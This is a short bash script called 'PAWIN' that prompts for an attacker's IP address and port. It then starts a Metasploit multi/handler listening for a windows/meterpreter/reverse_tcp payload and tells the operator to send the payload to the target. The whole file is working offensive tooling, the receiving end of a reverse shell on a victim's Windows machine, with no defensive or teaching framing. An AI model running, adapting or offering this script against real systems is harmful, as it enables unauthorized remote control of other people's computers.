#!/bin/bash
figlet "PAWIN"

echo "Enter Your Attacking machiene IP Address here NOTE:- This should be the same as the IP address in your payload: "
read ip

echo "Enter The listening port here (NOTE: This should be the same as the port in your payload) : "
read port

echo "your reverse listener is building up..." | lolcat
echo "This might take few seconds to complete" | lolcat
echo "Please send your payload to the target to initiate connection..." | lolcat
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost $ip; set lport $port; run;"
